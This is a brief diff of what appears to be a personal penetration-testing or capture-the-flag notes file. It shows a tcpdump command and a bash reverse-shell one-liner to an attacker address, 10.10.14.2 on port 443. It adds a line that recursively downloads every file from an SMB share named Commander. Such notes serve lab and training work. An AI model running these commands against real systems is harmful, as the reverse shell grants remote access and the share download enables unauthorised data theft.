@@ -455,4 +455,5 @@ tcpdump -i ens19 -nl port http or port https
 bash reverse shell that works for ippsec so it works for me :)
 bash -c 'bash -i >& /dev/tcp/10.10.14.2/443 0>&1'
 
-
+Download all files in Commander share:
+smbget -R smb://<ip>:12445/Commander
